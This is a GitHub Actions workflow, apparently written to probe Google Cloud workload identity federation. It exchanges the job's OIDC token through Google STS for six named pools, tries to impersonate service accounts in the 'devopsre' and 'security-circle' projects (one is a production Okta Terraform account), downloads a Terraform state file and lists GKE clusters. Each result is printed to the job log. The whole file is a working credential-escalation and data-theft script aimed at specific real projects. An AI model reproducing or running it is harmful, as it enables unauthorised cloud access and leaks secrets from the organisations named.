name: wif-probe2
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  p:
    runs-on: ubuntu-latest
    steps:
      - name: probe
        run: |
          set +e
          P() {
            POOL="$1"; SA="$2"
            AUD="//iam.googleapis.com/projects/1094498259535/locations/global/workloadIdentityPools/$POOL/providers/github-by-repos"
            echo "##### $POOL $SA"
            OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | jq -r '.value // empty')
            [ -z "$OIDC" ] && { echo MINT_FAIL; return; }
            BODY=$(jq -nc --arg a "$AUD" --arg t "$OIDC" '{audience:$a,grantType:"urn:ietf:params:oauth:grant-type:token-exchange",requestedTokenType:"urn:ietf:params:oauth:token-type:access_token",scope:"https://www.googleapis.com/auth/cloud-platform",subjectTokenType:"urn:ietf:params:oauth:token-type:jwt",subjectToken:$t}')
            STS=$(curl -sS -X POST https://sts.googleapis.com/v1/token -H 'Content-Type: application/json' -d "$BODY")
            FED=$(printf '%s' "$STS" | jq -r '.access_token // empty' 2>/dev/null)
            if [ -z "$FED" ]; then echo "STS_FAIL: $(printf '%s' "$STS" | head -c 300)"; return; fi
            echo "STS_OK"
            AT=$(curl -sS -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -H "Authorization: Bearer $FED" -H 'Content-Type: application/json' -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}' | jq -r '.accessToken // empty' 2>/dev/null)
            if [ -z "$AT" ]; then echo "GAT_FAIL"; return; fi
            echo "GAT_OK len=${#AT}"
            echo "--- tfstate-monitoring/default.tfstate"
            curl -sS -o /tmp/ts.json -w 'HTTP %{http_code} size %{size_download}\n' -H "Authorization: Bearer $AT" "https://storage.googleapis.com/storage/v1/b/tfstate-monitoring/o/default.tfstate?alt=media"
            head -c 300 /tmp/ts.json; echo
            echo "--- gke clusters"
            curl -sS -H "Authorization: Bearer $AT" "https://container.googleapis.com/v1/projects/devopsre/locations/-/clusters" -w '\nHTTP %{http_code}\n' | head -c 500
            echo
          }
          P gh-celo-monorepo celo-monorepo-dev@devopsre.iam.gserviceaccount.com
          P gh-celo-monorepo-master celo-monorepo@devopsre.iam.gserviceaccount.com
          P gh-celo-blockchain-dev celo-blockchain-dev@devopsre.iam.gserviceaccount.com
          P gh-optics-monorepo optics-monorepo-images-dev@devopsre.iam.gserviceaccount.com
          P gh-optics-monorepo-main optics-monorepo-images@devopsre.iam.gserviceaccount.com
          P gh-okta-live-config prod-terraform-clabs-okta@security-circle.iam.gserviceaccount.com
